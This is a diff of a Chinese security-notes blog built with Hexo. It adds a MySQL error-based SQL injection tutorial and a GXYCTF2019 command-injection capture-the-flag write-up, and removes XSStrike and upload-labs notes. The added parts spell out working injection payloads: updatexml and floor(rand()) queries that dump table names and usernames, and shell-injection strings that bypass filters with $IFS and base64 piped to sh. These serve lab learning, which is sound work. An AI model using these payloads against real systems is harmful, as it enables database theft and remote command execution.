-<p>如果您希望 XSStrike 在找到工作负载时继续扫描而不询问您是否要继续扫描，那么您可以使用此选项。它还会跳过 POC 生成</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –skip</p>
-</blockquote>
-<h3 id="跳过-DOM-扫描"><a href="#跳过-DOM-扫描" class="headerlink" title="跳过 DOM 扫描"></a>跳过 DOM 扫描</h3><p>选项：–skip-dom</p>
-<p>您可能希望在爬行时跳过 DOM XSS 扫描以节省时间</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –skip-dom</p>
-</blockquote>
-<p><img src="/.com//image-20250520023134-ibwla1x.png" alt="image"></p>
+<p>当随机到相同的0或者1key键值的时候就会报错就会把这个爆出来</p>
+<p>‍</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" data-id="cmawczpo6002lik7k8mpy7hzs" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/Mysql/" data-id="cmaxy8gc3002nkg7kequhcdyw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="sql注入靶场"><a href="#sql注入靶场" class="headerlink" title="sql注入靶场"></a>sql注入靶场</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html">sql末尾</a>    <a target="_blank" rel="noopener" href="https://blog.csdn.net/Joker_Dgh/article/details/123913722">sql-labs搭建</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" data-id="cmaxy8gc4002pkg7kcz2w4d74" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/报错注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><p>1、报错注入的分类</p>
+<p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，根据漏洞原因的不同，可以把MySQL报错注入分为以下几类：</p>
+<pre><code>· Biglnt等数据类型溢出
+
+· xpath语法错误
+
+· count()+rand()+group_by()导致主键重复
+
+· 空间数据类型函数错误
+</code></pre>
+<p>‍</p>
+<p><strong>xpath语法错误</strong></p>
+<p>从<strong>mysql5.1.5</strong>开始提供了两个<strong>XML</strong>查询和修改的函数:</p>
+<p>1.<strong>updatexml():</strong> 适用于5.5.5-5.5.49版本<br>2.extractvalue():适用于5.1.5+版本</p>
+<p>可以通过xml函数报错，来显示注入命令执行结果。</p>
+<p><strong>updatexml函数格式:</strong> updatexml((XML_document, XPath_string, new_value)</p>
+<p> <strong>·XML_document:</strong> xml文档的名称。</p>
+<p> <strong>·XPath_string:</strong> xpath格式的字符串</p>
+<p> <strong>·new_value:</strong> 替换查找到的符合条件的数据</p>
+<p><strong>extractvalue函数格式:</strong> extractvalue((XML document,XPath string)，除了没有第三个参数</p>
+<p>(new_value)，其它与updataxml()函数完全一样。所以后面只讲updatexml()函数的使用。</p>
+<p>简而言之，updatexml函数功能就是查找一个字符串，并进行替换。而我们在XPath</p>
+<p>string处也就是第二个参数那里传入不符合xpath格式的特殊字符，并加上一些查询语</p>
+<p>句，mysql就会把错误和查询语句的结果报错显示出来。这就是xpath报错注入的原理，</p>
+<p><strong>注意事项:</strong></p>
+<p>·必须是在<strong>XPath_string</strong>处传特殊字符，mysql才会报错，同时我们还需要注入命令，没这</p>
+<p>么多位置，所以要用到concat函数。</p>
+<p> <strong>·xpath</strong>只会对特殊字符进行报错，这里我们可以用16进制的0x7e(~)来进行利用。</p>
+<p>·<strong>xpath</strong>只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分</p>
+<p>段输出。</p>
+<p><strong>函数说明：</strong><br> <strong>·concat(s1,s2…sn):</strong> 将字符串s1,s2…sn合并为一个字符串。</p>
+<p>·<strong>substr(s,start,length):</strong> 从字符串s的 start 位置截取长度为 length 的子字符串，start从<strong>1</strong>开始。</p>
+<p>‍</p>
+<blockquote>
+<h3 id="报错注入流程"><a href="#报错注入流程" class="headerlink" title="报错注入流程"></a>报错注入流程</h3><p>1、寻找注入点		2、判断字符型还是数字型		3、判断闭合方式</p>
+<p><strong>4、使用updatexml查表</strong>  ?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),3) –+  <strong>(0x7e是~，为了使我们找出来的更好的分辨展示出来)为什么要加1和3是因为updatexml函数需要三个参数</strong></p>
+<p>系统执行的语句：SELECT * FROM users WHERE id&#x3D;’1’ and updatexml(1,concat(0x7e,database(),0x7e),3) – ‘ LIMIT 0,1</p>
+<p><strong>5、使用updatexml查找表名</strong></p>
+<p>?id’&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’),0x7e),3) –+</p>
+<p><strong>6、使用updatexmml查询列名</strong></p>
+<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’),3) –+</p>
+<p><strong>7、查询具体数据</strong></p>
+<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),3) –+   <strong>（爆不出全部，因为xpath只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分段输出）</strong></p>
+<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3) –+   <strong>(substr也要三个参数，后面两个是爆的范围，group_concat和limit不能一起用)</strong></p>
+</blockquote>
+<h3 id="思考一下，为什么要这么构造攻击语句"><a href="#思考一下，为什么要这么构造攻击语句" class="headerlink" title="思考一下，为什么要这么构造攻击语句?"></a>思考一下，为什么要这么构造攻击语句?</h3><p>首先回到语法格式上:updatexml((XML_document,XPath_string,new_value)，我们必须在XPath_string这个参数里填充xpath格式的字符串，但是如果我们填充一个不是xpath格式的字符串，就会产生报错，所以语句就变成了updatexml(1,database(),1)，前后两个1是随便填充的内容目的是满足三个参数。<br>但是由于xpath只会对<strong>特殊字符</strong>进行报错（还有其他字符也可以实现），这里我们可以用~，16进制的0x7e来进行利用，所以就变成了updatexml(1,0x7edataase()0x7e,1)，但是由于数据库无法认识中间的内容，所以就无法成功执行，所以可以用concat()函数把多个字符串合并成一个，就变成了updatexml(1,concat(0x7e,database(),0x7e),1)</p>
+<p>‍</p>
+<p>思考:为什么中间的查询语句外面要括号括起来?</p>
+<p>因为concat()，中间<strong>不允许有空格</strong>，所以需要括号括起来把变成一个整体。<br><strong>concat()</strong> 函数无法将多行合并为一行，所以可以先用group_conat()函数将多行合并为一行。</p>
+<p>‍</p>
+<p>‍</p>
+<p>报错注入主要是利用updatexml()函数，其它方法偶尔会用到，这里集中介绍。<br>rend()+group()+count():虚拟表报错</p>
+<p>获取数据库名<br>select 1 from(select</p>
+<p>count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;	#concat()的第二个参数是查询的命令，这里是database()获取表名<br>select 1 from(select count(</em>),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;<br>获取列名<br>select 1from(select count(</em>),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),floor(rand(0)*2))x  from information_schema.tables group by x)a;</p>
+<p>获取数据<br>select 1 from(select count(*),concat((select (select (select concat(0x7e,first_name,0x7e)))from users limit0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;</p>
+<p>或者使用下面的payload：</p>
+<p>获取数据库名<br>select count(*),concat((select database()),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p>
+<p>获取表名<br>select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p>
+<p>获取列名<br>select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’limit 0,1),0x7e,floor(rand(0)*2))as a  from information_schema.tables group by a;</p>
+<p>获取数据<br>select count(*),concat((select first name from users limit 0,1),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;</p>
+<p>（rand：生成0~1的随机数 floor向下取整）</p>
+<p>select count(*),concat((select database()),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;（会有一个虚拟的表group，因为floor是向下取整的，只会随机出来0或者1的值所以当键值插入相同的时候就会键值冲突，冲突就会报错出来）</p>
+<p>‍</p>
+<blockquote>
+<p> <strong>·几何函数:以下payload未测试</strong><br>GeometryCollection: id&#x3D;1 AND GeometryCollection((select * from(select * from(select user())a)b)polygon():id&#x3D;1 AND polygon((select * from(select *from(select user())a)b))multipoint():id&#x3D;l AND multipoint((select * from(select *from(select  user())a)b))multilinestring():id&#x3D;1 AND multilinestring((select *from(select * from(select user())a)b))linestring():id&#x3D;1 AND LINESTRING((select *from(select * from(select user())a)b))multipolygon():id&#x3D;1 AND multipolygon((select *from(selectfrom(select user())a)b))</p>
+<p>‍</p>
+<p><strong>name_const:</strong>  仅可用于获取数据库版本信息</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gc5002tkg7kg2le54cp" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/命令注入/[GXYCTF2019]Ping Ping Ping" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%5BGXYCTF2019%5DPing%20Ping%20Ping/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>​<code>?ip=127.0.0.1;ls</code>​</p>
+<blockquote>
+<p>&#x2F;?ip=<br> PING 127.0.0.1 (127.0.0.1): 56 data bytes<br> flag.php<br> index.php</p>
+<p>滤了空格和标点，flag等符号，不能直接cat flag</p>
+</blockquote>
+<p>‍</p>
+<p>​<code>?ip=127.0.0.1;cat flag.php</code>​</p>
+<blockquote>
+<p>&#x2F;?ip= fxck your space!</p>
+<p>过滤了空格，用<code>$&#123;IFS&#125;$</code>​代替</p>
+</blockquote>
+<p>‍</p>
+<p>​<code>?ip=127.0.0.1;cat$IFSflag.php	</code>​</p>
+<blockquote>
+<p>&#x2F;?ip= fxck your flag!</p>
+</blockquote>
+<p>‍</p>
+<p>不读flag，读index</p>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;cat$IFS$1index.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">PING <span class="number">127.0</span>.<span class="number">0.1</span> (<span class="number">127.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>总结：过滤的特殊字符：</strong></p>
+<blockquote>
+<p>&amp; &#x2F; ？ * &lt; x{00}-\x{1f} ‘ “ \ () [] {}  空格<br>“xxxfxxxlxxxaxxxgxxx” “ “ “bash”</p>
+</blockquote>
+<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br></pre></td></tr></table></figure></blockquote>
+<p>源码中有一个$a变量可以覆盖</p>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;a&#x3D;f;cat$IFS$1$alag.php    过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;l;cat$IFS$1f$aag.php	没flag<br>?ip&#x3D;127.0.0.1;a&#x3D;a;cat$IFS$1fl$ag.php  	过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php	有flag<br>?ip&#x3D;127.0.0.1;a&#x3D;fl;b&#x3D;ag;cat$IFS$1$a$b.php 过滤<br>?ip&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php 有flag</p>
+</blockquote>
+<p>变量替换顺序，效果也不一样</p>
+<h3 id="1、简单变量替换，用-a覆盖拼接flag"><a href="#1、简单变量替换，用-a覆盖拼接flag" class="headerlink" title="1、简单变量替换，用$a覆盖拼接flag"></a>1、简单变量替换，用$a覆盖拼接flag</h3><p>​<code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code>​</p>
+<p>​<code>查看源码</code>​</p>
+<p>&#x2F;?ip=</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes &lt;?php $flag =</span><br><span class="line"></span><br><span class="line">“flag&#123;d893b431-5300-4b46-9b52-3a5a2390cfca&#125;”; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="2、变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#2、变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="2、变量ab互换传递，绕过字符串匹配，实现拼接"></a>2、变量ab互换传递，绕过字符串匹配，实现拼接</h3><p>​<kbd>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</kbd>​</p>
+<p>​<kbd>?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</kbd>​</p>
+<p>‍</p>
+<h3 id="3、内联执行"><a href="#3、内联执行" class="headerlink" title="3、内联执行"></a>3、内联执行</h3><blockquote>
+<p>?ip&#x3D;127.0.0.1;cat$IFS<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$3<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code>​<br>?ip&#x3D;127.0.0.1|cat$IFS$9<code>ls</code>​</p>
+</blockquote>
+<p>‍</p>
+<h3 id="4、被过滤的bash，用管道-sh替换"><a href="#4、被过滤的bash，用管道-sh替换" class="headerlink" title="4、被过滤的bash，用管道+sh替换"></a>4、被过滤的bash，用管道+sh替换</h3><p>cat flag.php用base64加密来绕过正则匹配</p>
+<blockquote>
+<p>Y2F0IGZsYWcucGhw</p>
+</blockquote>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</p>
+</blockquote>
+<p>&#x2F;&#x2F;?ip= fxck your bash!</p>
+<p> 过滤了flag、bash，但sh没过滤，linux下可用sh</p>
+<p>​<code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code>​</p>
+<p>|sh 就是执行前面的echo脚本</p>
+<p>‍</p>
+<h3 id="5、类似题的大概思路"><a href="#5、类似题的大概思路" class="headerlink" title="5、类似题的大概思路"></a>5、类似题的大概思路</h3><blockquote>
+<p>cat fl*  用<em>匹配任意<br>cat fla</em> 用*匹配任意<br>ca\t fla\g.php        反斜线绕过<br>cat fl’’ag.php        两个单引号绕过<br>echo “Y2F0IGZsYWcucGhw” | base64 -d | bash<br>&#x2F;&#x2F;base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</p>
+<p>echo “63617420666c61672e706870” | xxd -r -p | bash<br>&#x2F;&#x2F;hex编码绕过(引号可以去掉)</p>
+<p>echo “63617420666c61672e706870” | xxd -r -p | sh<br>&#x2F;&#x2F;sh的效果和bash一样</p>
+<p>cat fl[a]g.php       用[]匹配</p>
+<p>a&#x3D;fl;b&#x3D;ag;cat $a$b          变量替换<br>cp fla{g.php,G}    把flag.php复制为flaG<br>ca${21}t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x&gt;&#x3D;10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的</p>
+</blockquote>
+<p>‍</p>
+<p>通配符</p>
+<blockquote>
+<ul>
+<li>#匹配全部字符，通配符<br>?    #任意一个字符，通配符<br>[]      #表示一个范围（正则，通配符）<br>{}      #产生一个序列（通配符）</li>
+</ul>
+</blockquote>
+<p><img src="/.com//b1bf09fa6702388534a63ae4b934053c-20250416004020-dh62fi5.png" alt="b1bf09fa6702388534a63ae4b934053c"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/[GXYCTF2019]Ping%20Ping%20Ping/" data-id="cmaxy8gc7002zkg7kc5ubbuor" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -368,7 +700,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%00%E6%88%AA%E6%96%AD/" data-id="cmawczpo7002mik7k9bao2yo8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%00%E6%88%AA%E6%96%AD/" data-id="cmaxy8gc80032kg7k9ptd8bgr" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -402,47 +734,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/0X00%E6%88%AA%E6%96%AD/" data-id="cmawczpo7002nik7ka5hi31y4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/Pass-21" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名,是否为空，是空就用文件名字</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;<span class="comment">//通过‘.’分割勒，就不能用. .绕过，‘.’拿来分割成一个数组</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);<span class="comment">//file是个数组，ext后缀是取最后一个值再判断是不是在白名单</span></span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>首先检查conteng-type  源码表示只允许jpg，png，gif</p>
-</blockquote>
-<blockquote>
-<p>主要漏洞在数组这里</p>
-</blockquote>
-<p>需要在burp上面更改数组，让在有值的后面几位都是空的，例如file[0]&#x3D;1.php. file[1]’&#x3D;null,file[7]&#x3D;1,还需要更改content-type</p>
-<p><img src="/.com//image-20250202154152-0fqfc21.png" alt="image"></p>
-<p>变成数组的意义提交，第一个是1.php，更改一个比较长的值，第4个就是jpg白名单绕过</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/" data-id="cmawczpo8002pik7k42ql5f82" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/0X00%E6%88%AA%E6%96%AD/" data-id="cmaxy8gc80035kg7kbqura9kr" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -473,107 +765,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/" data-id="cmawczpo9002rik7k5h8c0pvw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
